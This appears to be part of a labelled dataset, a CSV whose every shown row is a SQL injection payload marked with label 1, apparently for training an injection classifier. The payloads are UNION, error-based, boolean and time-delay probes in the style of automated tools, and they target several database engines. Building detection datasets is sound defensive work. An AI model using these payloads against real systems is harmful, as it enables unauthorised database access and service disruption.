,Sentence,Label
8590,"-3194""  )  )   )  or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4493 = 4493 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   and   (  (   ( ""erua"" = ""erua",1
8591,"-4919 )  union all select 2608,2608,2608,2608,2608,2608#",1
8592,"1"" and 6240 =  ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) ",1
8593,"-2434'  )  )   )  union all select 5509,5509,5509,5509,5509,5509,5509--",1
8594,"-7568""  )  )   )  or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4493 = 4493 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   and   (  (   ( ""jxge"" like ""jxge",1
8595,"1"" where 7015 = 7015 procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select  ( case when  ( 5840 = 5840 )  then 1 else 0 end  )  )  ,0x717a767a71  )  )  ,1 ) --",1
8596,"1"" )  and exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8190 = 8190,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )   and  ( ""hbgv"" = ""hbgv",1
8597,"-1869""  )  )   )  union all select 7122,7122,7122,7122,7122,7122,7122,7122,7122--",1
8598,-8004%' )  or  ( 2301 = 7504 ) *7504 and  ( '%' = ',1
8599,"iif ( 1378 = 6569,1,1/0 ) ",1
8600,"1, ( select  ( case when  ( 5726 = 5275 )  then 1 else 1/ ( select 0 )  end  )  )  ",1
8601,"1""  )  )   )  and  ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 9067 = 9067,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from information_schema.character_sets group by x ) a )  and   (  (   ( ""blkt"" like ""blkt",1
8602,"-2605%'  )  )   )  union all select 4738,4738#",1
8603,"1%""  )  )   )  waitfor delay '0:0:5' and   (  (   ( ""%"" = """,1
8604,"1'  )  )   or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select  ( elt ( 1808 = 1808,1  )  )   ) ,0x717a767a71 ) ,8666 )  and   (  (  'gydh' = 'gydh",1
8605,"1' union all select null,null,null,null,null,null,null--",1
8606,5739-5738,1
8607,"-7296%'  )  )   )  union all select 9322,9322,9322,9322--",1
8608,select  ( case when  ( 7033 = 1594 )  then 7033 else 7033* ( select 7033 from information_schema.character_sets )  end ) #,1
8609,"1"" and exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8190 = 8190,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )   and ""qzzg"" like ""qzzg",1
8610,"1%"" and 8594 =  ( select 8594 from pg_sleep ( 5  )  )  --",1
8611,"1' )  procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50  )  )    )  )   ) ,1 ) ",1
8612,"-4044%"" or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4493 = 4493 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   and ""%"" = """,1
8613,"1""  )  )   as nejd where 2885 = 2885",1
8614,-2745  )  )   as aywp where 9735 = 9735 or 5903 =  ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) --,1
8615,"select benchmark ( 5000000,md5 ( 0x4c4d6142  )  )   and   (  (   ( 9847 = 9847",1
8616,"-1844""  )  )   )  or make_set ( 9354 = 9354,7185 )  and   (  (   ( ""abdw"" like ""abdw",1
8617,"-8651"" )  where 8391 = 8391 union all select 8391,8391#",1
8618,-4562' )  or 3038 = 3038,1
8619,"1"" )  where 7840 = 7840 union all select null,null#",1
8620,"-7382'  )  )   or make_set ( 9425 = 4330,4330 )  and   (  (  'tvaz' like 'tvaz",1
8621,"select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and  ( ""yobb"" like ""yobb",1
8622,"1' and elt ( 1210 = 1210,sleep ( 5  )  )  ",1
8623,"-9037%"" union all select 6583#",1
8624,"1"" where 7022 = 7022",1
8625,"-4285'  )  )   )  union all select 8819,8819,8819,8819,8819,8819,8819,8819#",1
8626,1 rlike  ( select  ( case when  ( 7689 = 7689 )  then 1 else 0x28 end  )  )  -- jduw,1
8627,"1'  ( select  ( case when  ( 4587 = 4587 )  then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 )  end )  from  ( values ( 0  )  )   )  and 'fsvr' = 'fsvr",1
8628,"1 and elt ( 1210 = 1210,sleep ( 5  )  )  ",1
8629,select case when 2948 = 7279 then 1 else null end--,1
8630,"-1964' )  as ihsp where 6379 = 6379 or elt ( 6945 = 6165,6165 ) --",1
8631,"1%' union all select null,null,null--",1
8632,"1%""  )  )   )  or  ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 9173 = 9173,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from information_schema.character_sets group by x ) a )  and   (  (   ( ""%"" = """,1
8633,"-8133' )  union all select 6417,6417,6417,6417,6417,6417,6417,6417--",1
8634,"-5396'|| ( select 'fjhd' from dual where 4019 = 4019 union all select 4019,4019,4019,4019#",1
8635,"1 )  as wuio where 5312 = 5312 or 7552 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1
8636,"1  )  )   and 6414 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 )  and   (  (  4048 = 4048",1
8637,"1"" )  where 3393 = 3393 or 9643 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1
8638,"1'  )  )   or 9643 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 )  and   (  (  'ozan' = 'ozan",1
8639,"1%""  )  )   )  and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select  ( elt ( 3393 = 3393,1  )  )   ) ,0x717a767a71 ) ,1161 )  and   (  (   ( ""%"" = """,1
8640,"1""  )  )   as rign where 1604 = 1604 and 3661 = 3054--",1
8641,"1'  )  )   and elt ( 1210 = 1210,sleep ( 5  )  )   and   (  (  'ogpg' = 'ogpg",1
8642,-6813  )  )   )  or 6872 = 6872 and   (  (   ( 7304 = 7304,1
8643,-1876%' )  union all select 6463--,1
8644,-1908'  )  )   )  union all select 7665#,1
8645,"1 )  as wvpl where 9791 = 9791 and make_set ( 3491 = 9067,9067 ) --",1
8646,1%'  )  )   and 7533 = 7533 and   (  (  '%' = ',1
8647,"-9858"" or 8592 = 8553",1
8648,1 and 3715 in   (  (  char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 3715 = 3715 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   ) # yoch,1
8649,-3862' )  or 9323 = 9323#,1
8650,1  )  )   )  and 2853 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 2853 = 2853 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric )  and   (  (   ( 3505 = 3505,1
8651,"1 or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) # utdm",1
8652,"1'  )  )   )  or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 )  = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null )  and   (  (   ( 'cylu' = 'cylu",1
8653,"1 )  as tjwa where 1173 = 1173 or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select  ( elt ( 1297 = 1297,1  )  )   ) ,0x717a767a71  )  )  --",1
8654,"-2028%'  )  )   )  or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 1570 = 1570 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   )  and   (  (   ( '%' = '",1
8655,"1""  )  )   as jrld where 3488 = 3488",1
8656,"1""  )  )   )  or 4915 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1
8657,"-6659' )  where 1256 = 1256 union all select 1256,1256--",1
8658,"-1598  )  )   )  union all select 9418,9418,9418,9418,9418,9418,9418#",1
8659,"1'|| ( select 'mzsy' where 4940 = 4940 or elt ( 5873 = 5873,sleep ( 5  )  )  #",1
8660,"-2667 )  union all select 5848,5848,5848,5848--",1
8661,1'|| ( select 'allj' where 7334 = 7334,1
8662,"1"" and elt ( 4249 = 4249,7259 )  and ""kgtz"" like ""kgtz",1
8663,"1%' and elt ( 1210 = 1210,sleep ( 5  )  )   and '%' = '",1
8664,"1%'  )  )   )  union all select null,null,null,null,null,null--",1
8665,-5694  )  )   as cxnb where 6858 = 6858 or 9323 = 9323#,1
8666,"-5597' )  or make_set ( 2490 = 2164,2164 ) ",1
8667,1'|| ( select 'ptkj' from dual where 6263 = 6263 union all select null--,1
8668,1 )  as jdhz where 2021 = 2021,1
8669,"1%'  )  )   )  or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",1
8670,"1"" )  where 9223 = 9223 and exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8190 = 8190,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )  --",1
8671,"1'  )  )   )  and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   and   (  (   ( 'zovb' like 'zovb",1
8672,"1'  )  )   )  and make_set ( 8403 = 8403,8899 )  and   (  (   ( 'zxon' like 'zxon",1
8673,"1'  )  )   )  ( select  ( case when  ( 5451 = 5451 )  then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null )  else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 )  end )  from information_schema.system_users )  and   (  (   ( 'owga' like 'owga",1
8674,"1"" )  as wvxt where 7321 = 7321 and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",1
8675,"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 )  from dual# gnga",1
8676,"1 or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select  ( elt ( 1297 = 1297,1  )  )   ) ,0x717a767a71  )  )  # ogwe",1
8677,"1 where 3535 = 3535 and 3580 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1
8678,"1"" and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 6237 = 6237,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from  ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x )  and ""mezx"" like ""mezx",1
8679,"1 )  and 8635 =  ( select count ( * )  from generate_series ( 1,5000000  )  )  --",1
8680,"-7511  )  )   as xqzf where 9939 = 9939 union all select 9939,9939,9939,9939,9939,9939,9939--",1
8681,"1' where 8803 = 8803 or 4411 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1
8682,1'  )  )   as bbdf where 1327 = 1327,1
8683,"1 )  as nlig where 5964 = 5964 and 2388 = benchmark ( 5000000,md5 ( 0x6d457153  )  )  #",1
8684,"1%"" )  or  ( select * from  ( select ( sleep ( 5  )  )   ) ydpu )  and  ( ""%"" = """,1
8685,1  )  )   as kccx where 7547 = 7547 union all select null--,1
8686,"1%' and  ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 9067 = 9067,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from information_schema.character_sets group by x ) a )  and '%' = '",1
8687,-7772'  )  )   or 9323 = 9323#,1
8688,"iif ( 5571 = 4947,1,1/0 ) ",1
8689,"-6595  )  )   )  union all select 2688,2688,2688,2688,2688,2688,2688,2688,2688,2688#",1
8690,1'  )  )   )  and 2853 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 2853 = 2853 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric )  and   (  (   ( 'cbnc' like 'cbnc,1
8691,"1' )  as vlwh where 9403 = 9403 or elt ( 5873 = 5873,sleep ( 5  )  )  #",1
8692,"1%"" )  union all select null,null#",1
8693,"-4462%"" )  or 8571 = 8571--",1
8694,"1'  )  )   )  and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 )  = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null )  and   (  (   ( 'skdy' = 'skdy",1
8695,1'  )  )   )  or  ( select * from  ( select ( sleep ( 5  )  )   ) ydpu )  and   (  (   ( 'ljhc' = 'ljhc,1
8696,select  ( case when  ( 4341 = 7041 )  then 4341 else 4341* ( select 4341 from mysql.db )  end ) #,1
8697,"-2625' )  or elt ( 1032 = 1032,3623 )  and  ( 'eliy' = 'eliy",1
8698,"waitfor delay '0:0:5' and ""lhcv"" = ""lhcv",1
8699,"1"" )  where 2278 = 2278",1
8700,"1  )  )   )  union all select null,null#",1
8701,"1 and 6414 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) # hlrg",1
8702,"select * from generate_series ( 9167,9167,case when  ( 9167 = 2273 )  then 1 else 0 end )  limit 1--",1
8703,-2527  )  )   as oqpy where 7468 = 7468 or 3038 = 3038,1
8704,1%' waitfor delay '0:0:5'--,1
8705,"1' where 7080 = 7080 or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c  )  )  #",1
8706,"1'+ ( select 'mikf' where 5814 = 5814 or 5356 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1
8707,"1  )  )   as rsnb where 3168 = 3168 procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75  )  )    )  )   ) ,1 ) #",1
8708,"1"" where 5039 = 5039 and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1
8709,1' )  where 9516 = 9516,1
8710,"-9871"" )  union all select 9082#",1
8711,1'|| ( select 'adni' from dual where 6611 = 6611,1
8712,1  )  )   as wajy where 8593 = 8593,1
8713,-8404  )  )   order by 1--,1
8714,"-2759%""  )  )   or 7769 = 1249#",1
8715," ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) ",1
8716,"1 )  as nkjo where 8462 = 8462 union all select null,null,null,null,null,null,null,null,null--",1
8717,"1' where 1628 = 1628 and 6510 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1
8718,"-4822"" or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4493 = 4493 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   and ""owbp"" = ""owbp",1
8719,1' )  where 2974 = 2974 and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4386 = 4386 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )  --,1
8720,1  )  )   as dgso where 4654 = 4654 and 2853 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 2853 = 2853 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric ) --,1
8721,"select count ( * )  from generate_series ( 1,5000000 )  and   (  (   ( 1321 = 1321",1
8722,1' )  as sagj where 4558 = 4558,1
8723,1%'  )  )   or  ( select * from  ( select ( sleep ( 5  )  )   ) sddo ) #,1
8724,"1""  )  )   )  or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select  ( elt ( 1297 = 1297,1  )  )   ) ,0x717a767a71  )  )   and   (  (   ( ""yxpo"" like ""yxpo",1
8725,1'+ ( select oljg where 2006 = 2006 and 3754 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 3754 = 3754 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual  )  )  +',1
8726,"1%' )  or exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 6270 = 6270,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )   and  ( '%' = '",1
8727,"-1993%"" )  or 5903 =  ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' )  and  ( ""%"" = """,1
8728,"1 )  as ihan where 5298 = 5298 and elt ( 6587 = 3479,3479 ) --",1
8729,-5356' )  or 9323 = 9323#,1
8730,1' )  as jztg where 1222 = 1222 or sleep ( 5 ) #,1
8731,"1  )  )   and 3580 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1
8732,"1  )  )   as gobw where 3496 = 3496 union all select null,null,null,null,null,null,null,null,null--",1
8733,"1"" or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 )  and ""jbty"" like ""jbty",1
8734,"1' or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 )  = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null )  and 'yaje' = 'yaje",1
8735,-8370'  )  )   or  ( 3501 = 6407 ) *6407 and   (  (  'agcm' like 'agcm,1
8736,"1%""  )  )   )  and 6969 =  ( select 6969 from pg_sleep ( 5  )  )   and   (  (   ( ""%"" = """,1
8737,"1"" waitfor delay '0:0:5'--",1
8738,"select count ( * )  from generate_series ( 1,5000000 )  and   (  (   ( ""uydm"" = ""uydm",1
8739,"1'+ ( select uzan where 4312 = 4312 and make_set ( 3129 = 9555,9555  )  )  +'",1
8740,"1' )  or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select  ( elt ( 1808 = 1808,1  )  )   ) ,0x717a767a71 ) ,8666 )  and  ( 'kejy' = 'kejy",1
8741,"-9749"" where 7083 = 7083 or make_set ( 7577 = 1182,1182 ) --",1
8742,1%'  )  )   )  and 2853 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 2853 = 2853 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric )  and   (  (   ( '%' = ',1
8743,"-1050""  )  )   or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4493 = 4493 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   and   (  (  ""orfo"" like ""orfo",1
8744,1%'  )  )   )  and  ( select * from  ( select ( sleep ( 5  )  )   ) gcrr ) #,1
8745,1' )  where 3893 = 3893,1
8746,1%' )  rlike sleep ( 5 ) #,1
8747,"-4182  )  )   as wkfh where 6145 = 6145 union all select 6145,6145,6145,6145,6145#",1
8748,"1 )  or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) ",1
8749,"1' )  or 8421 =  ( select count ( * )  from generate_series ( 1,5000000  )  )   and  ( 'xkxi' like 'xkxi",1
8750,"1"" )  where 9020 = 9020 or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 1045 = 1045,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from  ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) --",1
8751,"1  )  )   )  or 5356 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1
8752,"-9606%""  )  )   )  union all select 8572,8572,8572,8572,8572,8572,8572,8572,8572--",1
8753,"-3498""  )  )   as xbvb where 2056 = 2056 union all select 2056,2056,2056,2056,2056,2056,2056--",1
8754,"1' and 8514 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 )  and 'tfso' = 'tfso",1
8755,"1' in boolean mode )  or elt ( 6272 = 6272,sleep ( 5  )  )  #",1
8756,"1 and elt ( 4249 = 4249,7259 ) # lwyo",1
8757,"1"" )  as semi where 4260 = 4260",1
8758,1'  )  )   as qswu where 6377 = 6377,1
8759,"1%"" )  and 8514 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 )  and  ( ""%"" = """,1
8760,"-9496  )  )   )  or elt ( 7511 = 3951,3951 )  and   (  (   ( 3514 = 3514",1
8761,"-8686"" where 4532 = 4532 or elt ( 3301 = 9065,9065 ) --",1
8762,"1"" )  where 8254 = 8254 and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1
8763,"1 )  or 4915 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1
8764,select case when 5894 = 4052 then 1 else null end--,1
8765,"select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and   (  (   ( 4537 = 4537",1
8766,"1%"" )  and make_set ( 9956 = 1060,1060 )  and  ( ""%"" = """,1
8767,1%' and sleep ( 5 )  and '%' = ',1
8768,"1"" or sleep ( 5 )  and ""telb"" = ""telb",1
8769,1%' )  and  ( 3020 = 3020 ) *6703 and  ( '%' = ',1
